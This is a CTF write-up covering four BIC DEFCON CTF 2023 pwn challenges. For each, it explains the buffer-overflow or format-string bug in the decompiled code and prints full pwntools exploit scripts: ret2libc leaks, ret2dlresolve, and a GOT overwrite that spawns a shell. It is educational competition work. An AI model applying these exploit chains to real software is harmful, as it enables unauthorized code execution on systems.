![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/4747e2d1-66a2-4932-b965-863f83fb3966)<h3> BIC DEFCON CTF 2023 </h3>

### Description: This was a fun ctf I did and it taught me new things >3

<h3> Challenge Solved: </h3>

## Pwn
-  Puts in boot
-  Karma
-  Breakup
-  Dubdubdub
-  Shellstorm

## Cryptography
- Row row row your boat

### Puts in boot [First Blood 🩸]

We are given a binary file attached to it

Checking the file type shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/89cb3511-2060-42f3-b332-c7ba455220ed)

We are working with a x64 binary which is dynamically linked and not stripped

From the result of checksec on this binary we can tell that the binary has no protection enabled on it

What looks interesting is the fact NX is disabled meaning that the stack is executable

And with that it's possible for us to place shellcode on the stack and execute it 

Anyways let us see what the binary does

Running it shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ad11f512-9eb4-4138-8d9e-8578b3be4b16)

It receives our option prints out some words and exits

To understand the vulnerability in this binary I'll read the decompiled code 

Using ghidra I decompiled the binary 

Here's the main function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/36b3d5a5-589a-489c-8e92-0bc4b1cf6b2a)
```c

void main(void)

{
  do {
    AI();
  } while( true );
}
```

It calls the AI function while it returns true

Let us check the AI function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5ab50d20-a781-45d5-bc59-bcebb03a7926)
```c
void AI(void)

{
  char buffer [79];
  char option;
  
  puts("Know of Andrej Karpathy?");
  puts(
      "A: I\'m sorry, who?\nB: Why should I?\nC: Uum, lemme Google and come back\nD: Ofcourse I do!"
      );
  fflush(stdout);
  __isoc99_scanf("%1s",&option);
  if (option == 'A') {
    puts("Andrej Karpathy!! You know, famous computer scientist?");
    puts("A: Yeah, no!\nB: Oooh yeeah!");
    fflush(stdout);
    __isoc99_scanf("%1s",&option);
    if (option == 'A') {
      puts("This Gen Alpha...lol. Tell me, what do you do in your free time if not learning ML?");
      fflush(stdout);
      getchar();
      fgets(buffer,0x100,stdin);
    }
    else if (option == 'B') {
      puts(
          "Yeah, that dude! We\'ll use his ML papers to get control of the world again. Be seeing yo u :)"
          );
    }
    else {
      puts("Sorry, invalid option. Let\'s try this again, shall we?");
    }
  }
  else {
    if (option == 'B') {
      puts("Why shouldn\'t you?");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    if (option == 'C') {
      puts("Sure. Learn a few things about him and come back :)");
    }
    else {
      if (option == 'D') {
        puts("Finally! Someone of culture!");
                    /* WARNING: Subroutine does not return */
        exit(0);
      }
      puts("Sorry, invalid option. Let\'s try this again, shall we?");
    }
  }
  return;
}
```

I won't explain what each option does but only the vulnerable section of the code as it's quite readable and understandable

The vulnerability in this program lies here:

```c
  char buffer [79];

  if (option == 'A') {
    puts("Andrej Karpathy!! You know, famous computer scientist?");
    puts("A: Yeah, no!\nB: Oooh yeeah!");
    fflush(stdout);
    __isoc99_scanf("%1s",&option);
    if (option == 'A') {
      puts("This Gen Alpha...lol. Tell me, what do you do in your free time if not learning ML?");
      fflush(stdout);
      getchar();
      fgets(buffer,0x100,stdin);
    }
```

It sets the buffer to hold up only 79 bytes and when option 'A' is chosen twice we get a prompt which receives our input and stores it in the buffer and we are allowed to write in 0x100 bytes 

With that there's a buffer overflow since the amount of bytes the buffer can hold up is 79

Now that we know that let us get the offset which is the amount of bytes required to overwrite the instruction pointer

I used gdb-gef for this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/aa8f28e4-0ddc-4e48-8de1-1ab98674cbb3)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ab4da738-414e-4d78-8846-e146cefc5c56)

The offset is `88`

Now we need a way to exploit this binary to spawn a shell 

Remember that no mitigation is enabled so we can potentially perform ret2shellcode

But I don't feel like going through that since no easy gadget like `jmp rsp; ret`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8ffd82dc-ce8e-4fe1-9782-90f077230d8a)

So I'll go with ret2libc

Since plt of puts is available during the program execution we can potentially use that to leak the got address of puts
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a2b32b14-91ce-41d2-9899-09a7b10e9f1e)

Here's how my exploit will go:
- Leak GOT puts from libc
- Rop to system

In order to do this we need gadgets

And luckily the gadgets needed for the leak is available
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/56e07656-a99f-48d0-b14b-ced64e073bcc)

Why I need `pop rdi; ret` is because when `puts` is called to write values to stdout it requires a parameter to be passed 

The way parameters are passed in x64 is via registers so in this case we want to populate the rdi with the address of `puts@got`

Here's my exploit [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/bicdefcon_23/puts_in_boot/exploit.py)

```python
#!/usr/bin/python3
from pwn import *
import warnings

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './puts_in_boots'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'
warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

# Load libc library (identified version from server - https://libc.blukat.me)
# libc = ELF('libc6_2.35-0ubuntu3.1_amd64.so')
libc = elf.libc

offset = 88
pop_rdi = 0x00000000004011d6 # pop rdi; ret; 
ret = 0x000000000040101a # ret; 


payload = flat({
    offset: [
        pop_rdi,
        elf.got['puts'],
        elf.plt['puts'],
        elf.symbols['main']
    ]
})

io.recvuntil('D: Ofcourse I do!')
io.sendline('A')
io.sendline('A')

# Leak address
io.sendline(payload) 
io.recvline()
io.recvuntil('ML?')
io.recvline()
got_puts = unpack(io.recv()[:6].ljust(8, b"\x00"))
info("got puts: %#x", got_puts)

# Calculate libc base
libc.address = got_puts - libc.symbols['puts']
info("libc_base: %#x", libc.address)

sh = next(libc.search(b'/bin/sh\x00'))
system = libc.symbols['system']
info('/bin/sh: %#x', sh)
info('system: %#x', system)

# Payload to spawn shell
payload = flat({
    offset: [
        pop_rdi,
        sh,
        ret,
        system
    ]
})

io.sendline('A')
io.sendline('A')
io.sendline(payload)

io.interactive()
```

Running it works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6153b378-ce5c-48f1-a601-6bc705d591ce)

The remote instance isn't up so I can't do it remotely

But if it were up and we ran the exploit it won't work that's because the binary libc version is different from mine

That doesn't change the fact it won't be leaked

With that we can try to figure the libc being used remotely using this [site](https://libc.blukat.me/) 

And just search for puts address which I got to be `libc6_2.35-0ubuntu3.1_amd64.so`

With this I assumed that the other pwn challenges will be running on the same libc so if we eventually come across any challenge that requires leaking libc we won't need to worry about us figuring the remote libc 

### Karma [First Blood 🩸]

We are given a binary file attached to this challenge

Checking the mitigations enabled shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d3e3b51b-5da7-4727-8a6b-529713ebc895)

We are working with a x64 binary which is dynamically linked and not stripped

The only protection enabled on this binary is `NX` which prevents the stack from being executable

I'll run the binary to know what it does
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7bcb6155-8d34-47e4-8166-9f01b2449d55)

It receives our option then another input and exit

To understand what's happening I'll decompile the binary using ghidra

Here's the main function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2f740d70-0a0f-44e5-9fd0-cf1a9ec5648e)
```c
undefined8 main(void)

{
  char buffer [79];
  char option;
  
  write(1,
        "So now you know a thing or two about Andrej right?\nA: yes\nB: no\nC: I\'m honestly not sur e where this is headed.\n"
        ,0x70);
  __isoc99_scanf("%1s",&option);
  if (option == 'A') {
    write(1,
          "Great! I\'m looking to hire people and build a team which would work on redefining machin e learning algos.\n"
          ,0x6a);
    write(1,
          "Sadly, we don\'t have interviews these days, but can you get access to the artificial neu ral network?\n"
          ,0x65);
    getchar();
    fgets(buffer,0x100,stdin);
  }
  else if (option == 'B') {
    write(1,&stuffz,0x4f);
  }
  else if (option == 'C') {
    write(1,"It\'ll get exciting, worry not :)\n",0x21);
  }
  else {
    write(1,"A...B...C",9);
  }
  return 0;
}
```

Looking at the code we can spot the vulnerability

```c
char buffer [79];

  if (option == 'A') {
    write(1,
          "Great! I\'m looking to hire people and build a team which would work on redefining machin e learning algos.\n"
          ,0x6a);
    write(1,
          "Sadly, we don\'t have interviews these days, but can you get access to the artificial neu ral network?\n"
          ,0x65);
    getchar();
    fgets(buffer,0x100,stdin);
```

We can see that it assigns a buffer which can only hold up 79 bytes and then when option 'A' is chosen we get the option to store value to that buffer

And it can receive up to 0x100 bytes which is stored in a buffer that can only hold up 79 bytes

A buffer overflow :P

I'll get the offset needed the overwrite the instruction pointer
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5b1dfb3b-2a7c-4cb7-8ef3-8195f3476d72)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/221017d3-5215-43db-b036-d3c422ca8a9e)

The offset is 88

How can we spawn shell from here?

We can perform a ret2libc again but this time around use `write` to leak `write@got`

From the syscall of [write](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md) 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0ab684c8-60a8-41fd-ab93-bcbf393f2931)

```
syscall name  | %rax  | %rdi  | %rsi      | %rdx
write           0x1      fd     char *buf   size
```

We need the value of `rax` to be set to `0x1`, the value of `rdi` to be the file descriptor, the value of `rsi` to be the buffer to read/write and `rdx` to hold the size of bytes to read/write

In our case here's how it will be:

```
write(0x1, write@got, 0x20)
```

We will write 200 bytes of the value of got of `write` to standard output

The byte can also be just `8` afterall it's just 8 bytes that will be the value

Now we need the gadgets 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9802007d-c624-4aa7-9b5d-cb31edbead44)

Everything is set so let us exploit this 

Here's how my exploit will go:
- Leak got of write
- Rop to system

Here's my exploit [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/bicdefcon_23/karma/exploit.py)

```python
#!/usr/bin/python3
# Author: Hack.You
from pwn import *
import warnings

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './karma'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'
warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

# Load libc library (identified version from server - https://libc.blukat.me)
# libc = ELF('libc6_2.35-0ubuntu3.1_amd64.so')
libc = elf.libc

offset = 88

pop_rdi = 0x0000000000401196 # pop rdi; ret;
pop_rsi = 0x0000000000401198 # pop rsi; ret; 
pop_rdx = 0x000000000040119a # pop rdx; ret; 

ret = 0x000000000040101a # ret; 


payload = flat({
    offset: [
        pop_rdi,
        0x1,
        pop_rsi,
        elf.got['write'],
        pop_rdx,
        0x20,
        elf.plt['write'],
        elf.symbols['main']
    ]
})

io.recvuntil('headed.')
io.sendline('A')

# Leak address
io.sendline(payload) 
io.recvline()
io.recvuntil('network?')
io.recvline()
got_write = unpack(io.recv()[:6].ljust(8, b"\x00"))
info("got write: %#x", got_write)

# Calculate libc base
libc.address = got_write - libc.symbols['write']
info("libc_base: %#x", libc.address)

sh = next(libc.search(b'/bin/sh\x00'))
system = libc.symbols['system']
info('/bin/sh: %#x', sh)
info('system: %#x', system)

# Payload to spawn shell
payload = flat({
    offset: [
        pop_rdi, # System("/bin/sh")
        sh,
        ret,
        system
    ]
})

io.sendline('A')
io.sendline(payload)

io.interactive()
```

You will notice I didn't use any `pop rax` gadget and that's not needed because when the program execution eventually reaches `write@plt` the value of `rax` will be set to `0x1`

Running the exploit works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/404fadc5-4f85-4462-b8ad-5c5b7559774e)

Since we have the remote libc file we can use replace this in the exploit for it to work remotely:

```python
Replace: libc = elf.libc
To: libc = ELF('libc6_2.35-0ubuntu3.1_amd64.so')
```

### Breakup [First Blood 🩸]

After downloading the attached file and checking the file type and mitgation enabled I got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7002fe7f-792c-4dae-824f-02555a3d7528)

The same as the previous ones

I'll run it to know what it does
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a0a84113-7179-4400-b4ec-2e3f494f5c9a)

It prints out some words receives our input then exits

Using ghidra I decompiled the binary

Here's the main function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c16543f5-159c-452e-96d0-72413d5bda47)
```c

undefined8 main(void)

{
  undefined8 breakup;
  undefined8 local_f0;
  undefined8 local_e8;
  undefined8 local_e0;
  undefined8 local_d8;
  undefined8 local_d0;
  undefined8 local_c8;
  undefined8 local_c0;
  undefined8 local_b8;
  undefined8 local_b0;
  undefined8 local_a8;
  undefined8 local_a0;
  undefined8 local_98;
  undefined8 local_90;
  undefined8 local_88;
  undefined8 local_80;
  undefined8 local_78;
  undefined8 local_70;
  undefined2 local_68;
  undefined buffer [72];
  FILE *ptr;
  
  ptr = stdout;
  breakup = 0x6b6f726220656853;
  local_f0 = 0x7469772070752065;
  local_e8 = 0x20283a20656d2068;
  local_e0 = 0x65726568206d2749;
  local_d8 = 0x6e696b6e69726420;
  local_d0 = 0x6173206568742067;
  local_c8 = 0x656c207473656464;
  local_c0 = 0x6b616873206e6f6d;
  local_b8 = 0x6874206e6f207365;
  local_b0 = 0x74656e616c702065;
  local_a8 = 0x796c646e694b202e;
  local_a0 = 0x6574696e75657220;
  local_98 = 0x6b63616220656d20;
  local_90 = 0x7247206874697720;
  local_88 = 0x76696c4f20656361;
  local_80 = 0x706d6f6854206169;
  local_78 = 0x6d2069202c6e6f73;
  local_70 = 0x2e72656820737369;
  local_68 = 10;
  fputs((char *)&breakup,stdout);
  read(0,buffer,0x100);
  return 0;
}
```

It uses `fputs` to print out those words then uses `read` to read 0x100 bytes into a buffer that can only hold up 72 bytes

So we have our buffer overflow

I got the offset using the same way I did previously and it was `88`

Now how do we exploit this?

Well I was first trying if I could leak got using `fputs` and that failed reason if because in the exploit I was trying to refer `stdout` as `0x1` but that's wrong because `stdout` is a function in libc and can't just be replaced using a number set in a register

So what else can we do here 🤔

Looking at [this](https://ir0nstone.gitbook.io/notes/) I found a ROP technique called Ret2DlResolve

And that's what I used to exploit this binary

Here's my exploit [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/bicdefcon_23/breakup/exploit.py)

```python
from pwn import *

context.binary = 'breakup'

# Make Ret2DLResolve Payload
rop = ROP(context.binary)
dlresolve = Ret2dlresolvePayload(context.binary, symbol='system', args=['/bin/sh\x00'])
rop.read(0, dlresolve.data_addr)
rop.raw(rop.ret[0])
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()
pprint(rop.dump())

if len(sys.argv) == 1:
    io = context.binary.process()
else:
    host, port = sys.argv[1].split(':')
    io = remote(host, port)

try:
    io.sendline(b'A' * 88 + raw_rop)
    io.sendline(dlresolve.payload)
    io.interactive()
except EOFError:
    pass
```

Running it works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e5360436-b004-4143-a982-c139b7af5532)


### Dubdubdub [First Blood 🩸]

After downloading the binary and checking the file type / mitgations I got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e1c2786a-488f-497b-ae61-f1d22f262356)

It's the same file type as the previous ones but what's different here is the mitigation enabled

- NX ( No-Execute)
- PIE (Position Independent Executable)

I've talked about NX so let me talk about PIE

Basically when PIE is enabled that means that during each time of program execution it will get loaded into different memory address

This means you cannot hardcode values such as function addresses and gadget locations without finding out where they are

Such a pain right?

Let us move on

Running the binary shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/448f1af9-8864-4bb9-978c-7fb21821b328)

This program seems to be in a loop and it receives our input depending on the option chosen then prints it out 

Before I start anything here I want to patch the binary since I'm pretty sure the remote will be using the same libc as the previous one

I used [pwninit](https://github.com/io12/pwninit) to do that

```
pwninit --bin dubdubdub libc6_2.35-0ubuntu3.1_amd64.so --no-template
```

Let us move on!

Using ghidra I decompiled the binary here's the main function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/27e2e110-7d69-4e00-af2a-cdbdec75c77c)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/4d227653-3235-465b-a0e5-2bc854cf741a)
```c
void main(void)

{
  int fd;
  long in_FS_OFFSET;
  char option;
  char buffer [264];
  undefined8 canary;
  
  canary = *(undefined8 *)(in_FS_OFFSET + 0x28);
  do {
    write(1,"Let\'s start a war! Kali or Parrot:\nKali\nParrot\nNeither\nChoose your fighter: ",0x4c
         );
    __isoc99_scanf("%s",&option);
    fd = strncmp(&option,"Kali",4);
    if (fd == 0) {
      printf("%s","Right?? ");
      fflush(stdout);
      printf(&option);
      fflush(stdout);
      printf(" %s\n",&DAT_00102068);
      fflush(stdout);
    }
    else {
      fd = strncmp(&option,"Parrot",6);
      if (fd == 0) {
        puts("Nooooope!!");
        fflush(stdout);
      }
      else {
        fd = strncmp(&option,"Neither",7);
        if (fd == 0) {
          printf("%s","Oooh sorry. I meant to ask:\nArch\nGentoo\nChoose your fighter: ");
          fflush(stdout);
          __isoc99_scanf("%s",&option);
          fd = strncmp(&option,"Arch",4);
          if (fd == 0) {
            puts("We are sorry!");
            fflush(stdout);
          }
          else {
            fd = strncmp(&option,"Gentoo",6);
            if (fd == 0) {
              puts(&DAT_00102118);
              fflush(stdout);
            }
            else {
              puts("Never heard of that, yikes!!");
              fflush(stdout);
            }
          }
        }
        else {
          write(1,"Which one is that??\n",0x14);
        }
      }
    }
    write(1,"Please tell me more about it: ",0x1e);
    getchar();
    fgets(buffer,0x100,stdin);
    printf(buffer);
    fflush(stdout);
  } while( true );
}
```

I won't explain what the code does since its kinda understandable looking at it

But here's the vulnerability

```c
char buffer [264];
fgets(buffer,0x100,stdin);
printf(buffer);
```

It receives 255 bytes of our input and stores in a buffer that can hold up 264 bytes 

No buffer overflow since there's amount of bytes the buffer can hold

But below it, the program uses `printf` to print the content of the buffer which is basically our input

That's where the bug lies!!! We have a format string vulnerability because it uses `printf` to print the content of `buffer` without using a format specifier

How do we exploit this?

First let us get the offset of our input on the stack using the `%p` format specifier
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/aa25a666-3ee6-4f5b-9b93-c2646cc74f57)

Our input is at offset `8`

Now what next?

From the protections enabled on the binary we know that `No RELRO`

That means we can overwrite the functions in the Global Offset Table (GOT) 

And what we would want to overwrite is `printf` to `system` 

So that when `printf` is called it would be `system`

Luckily this binary is running in a loop making it our exploit stage less

Since ASLR is enabled we would want to calculate the libc base address

Here's how I got it

First we need to know the format of how a libc function would look like and I used `vmmap` in gdb to do that
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/dad30164-0314-44d2-ba74-7472c1218b44)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e6af7db2-68a2-44e8-9a8c-b5e625d95aeb)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9c0f7ce3-7787-4129-9092-6bed7027e8b2)

Looking at that the libc starts from `0x00007ffff7c00000` and ends at `0x00007ffff7c28000`

But that's the case is ASLR is disabled and gdb-gef disables it by default

So I'll run it again but this time enabled aslr on gdb
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/96aebbc0-dbab-49a5-9e93-acd2187854cb)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5312062c-9aa7-47cc-aac4-271fe3bfec3c)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f1292088-e3b5-409d-b96d-f9be1dfaeb05)

Now we have the right value 

Libc starting from `0x00007fa0d7600000` and ends at `0x00007fa0d7628000`

What that means is that any function in libc will have that range of memory address

And that's important because we can calculate the libc base 

At this point we need a memory address that resembles that

I made this little fuzz script

```python
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ("server", "port")
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = """
init-pwndbg
continue
""".format(**locals())

# Binary filename
exe = "./dubdubdub"
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = "info"
warnings.filterwarnings("ignore")

io = start()

io.sendline('Kali')
out = ""
for i in range(30,60):
    out += f"{i}=%{i}$p "
io.sendline(out)

io.interactive()
```

On running it shows and attaching the process to gdb I got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9c9565f2-a1d3-4c9f-9742-856ade2129c6)

At offset 43 it's a libc function

And the value there is this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/dde01129-4a3e-4f41-8041-b8dbc74e973d)
```
__libc_start_call_main+128
```

So to get into the `__libc_start_call_main` I'll need to subtract `128` from it
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/98cae3c8-81aa-4148-8d70-507422889eaa)

Now that we know that the libc base address will be calculate this way:

```
leak - (0x7fb0d9229d10 - 0x7fb0d9200000)
```

To confirm that I made this script

```python
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ("server", "port")
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = """
init-pwndbg
aslr on
continue
""".format(**locals())

# Binary filename
exe = "./dubdubdub"
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = "info"
warnings.filterwarnings("ignore")

io = start()
libc = ELF('./libc.so.6')

io.sendline("kali")
io.sendline("Libc="+ "%43$p")
io.recvuntil("Libc=")

leak = int(io.recvline().strip().decode()[0:14], 16) - 128
print("Libc Leak:", hex(leak))
libc.address = leak - (0x7f63dbe29d10- 0x7f63dbe00000)
print("Libc base address:", hex(libc.address))

io.interactive()
```

Running it works and confirms that we have a way of getting the libc base address
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0f4dd6d6-9f1e-450b-b9d8-ad1fe2b4c882)

Since we have that we can call our any other function in the libc meaning we have the exact address of `system`

Now the next thing is that `printf` is calling from the ELF Global Offset Table (GOT)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ed718f75-f318-4987-b814-f50f75491933)

And since PIE is enabled we can't just overwrite it unless we know the exact address

So let us leak and calculate elf base address

I used my fuzz script and got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/04ac50d9-04e9-4dab-89d1-ca25a89a631c)

The elf base address starts from `0x5585a9283000` and ends at `0x5585a9284000`

At offset 45 shows an address that belongs in that range

Thefore in calculating the elf base address I did this

```
leak - (0x5585a9284229 - 0x5585a9283000)
```

With that set we have the elf base address

And at this point we can overwrite `elf.got.printf` to `libc.symbols.system`

Pwntools can help with overwriting values using the `fmtstr_payload` function

Here's my [solve script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/bicdefcon_23/dubdubdub/exploit.py)

```python
from pwn import *
import warnings

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ("server", "port")
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = """
init-pwndbg
continue
""".format(**locals())

# Binary filename
exe = "./dubdubdub"
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = "info"
warnings.filterwarnings("ignore")

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

libc =  ELF("./libc.so.6")

# ===========================================================
#           Leak libc and calculate libc base address 
# ===========================================================

# out = ""
# for i in range(30,60):
#     out += f"{i}=%{i}$p "
# print(out)
# io.sendline(out)

io.sendline("kali")
io.sendline("Libc="+ "%43$p")
io.recvuntil("Libc=")

leak = int(io.recvline().strip().decode()[0:14], 16) - 128
print("Libc Leak:", hex(leak))
libc.address = leak - (0x7f63dbe29d10- 0x7f63dbe00000)
print("Libc base address:", hex(libc.address))

# ===========================================================
#           Calculate ELF base address
# ===========================================================

io.sendline("kali")
io.sendline("Pie="+ "%45$p")
io.recvuntil("Pie=")

leak = int(io.recvline().strip().decode()[0:14], 16)
print("Pie leak", hex(leak))
elf.address = leak - (0x55f62235b229 - 0x55f62235a000)
print("Pie base address", hex(elf.address))

# ===========================================================
#          GOT Overwrite
# ===========================================================

offset = 8
printf = elf.got["printf"]
shell = libc.symbols["system"]
payload = fmtstr_payload(offset, {printf: shell})

io.sendline("kali")
io.sendline(payload)

# ===========================================================
#          Spawn Shell
# ===========================================================

io.sendline('kali')
io.sendline('/bin/bash')

io.interactive()
```






